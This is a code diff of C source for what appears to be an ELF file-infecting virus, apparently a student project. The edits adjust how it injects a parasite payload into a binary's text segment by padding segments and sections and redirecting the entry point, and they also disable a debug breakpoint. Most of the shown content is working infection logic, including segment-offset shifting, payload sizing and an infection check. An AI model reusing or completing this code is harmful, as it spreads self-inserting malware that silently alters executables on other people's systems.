@@ -53,7 +53,7 @@ struct linux_dirent64 {
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE (0x4000)
+#define PAGE_SIZE (4096 * 3)
 #define PAGE_SZ64 PAGE_SIZE
 # define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
 type name(type1 arg1,type2 arg2, type3 arg3)\
@@ -124,7 +124,7 @@ _start()
 	write(1,toto,2);
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-		 "int3\n"
+//		 "int3\n"
 	        "call do_main\n");
 	exit(0);
 
@@ -780,10 +780,8 @@ int do_the_job(char buff[],size_t size, char *path)
  	debut[17] =0;
 	ft_putstr(debut);
 	//printf("debut do_the_job\n");
-	Elf64_Ehdr          *header;
-	Elf64_Phdr*             seg;
-	Elf64_Shdr*             sec;
-	unsigned int payload_len = ((char *)&myend - (char *)&real_start )+ 7;
+
+	unsigned int payload_len = ((char *)&myend - (char *)&real_start )+ SIZE_BEFORE_ENTRY_POINT;
 ft_putnbr(payload_len);
 ft_putchar('\n');
 	Elf64_Addr parasite_vaddr;
@@ -802,7 +800,6 @@ ft_putchar('\n');
 	{
 		return (1);
 	}
-	header = (Elf64_Ehdr *)buff;
 	 if(0 && is_infected(buff))
 	 {
 	 	char deja[15];
@@ -841,6 +838,7 @@ ft_putchar('\n');
 	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
 
 	// Increase section header offset by PAGE_SIZE
+
 	hdr->e_shoff += PAGE_SZ64;
 
 	for(int i=0; i < hdr->e_phnum; i++){
@@ -849,16 +847,12 @@ ft_putchar('\n');
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
-			old_e_entry = hdr->e_entry;
 			hdr->e_entry = payload_vaddr + 63;
 			phdr[i].p_filesz += PAGE_SZ64;
 			phdr[i].p_memsz += PAGE_SZ64;
 
 			for(int j=i+1; j < hdr->e_phnum; j++)
-			{
 				phdr[j].p_offset += PAGE_SZ64;
-
-			}
 
 			break;
 		}
@@ -866,17 +860,15 @@ ft_putchar('\n');
 
 	for(int i=0; i < hdr->e_shnum; i++){
 		if(shdr[i].sh_offset > text_end)
-		{
 			shdr[i].sh_offset += PAGE_SZ64;
-
-		}
 
 		else if(shdr[i].sh_addr + shdr[i].sh_size == payload_vaddr)
 			shdr[i].sh_size += payload_len;
 	}
+
 	ft_putchar('4');
 	ft_putchar('\n');
-	new_file(buff,size,text_end, path,old_e_entry);
+	new_file(buff,size,text_end, path,entry);
 	char fin[5];
 	fin[0] ='f';
 	fin[1]='i';
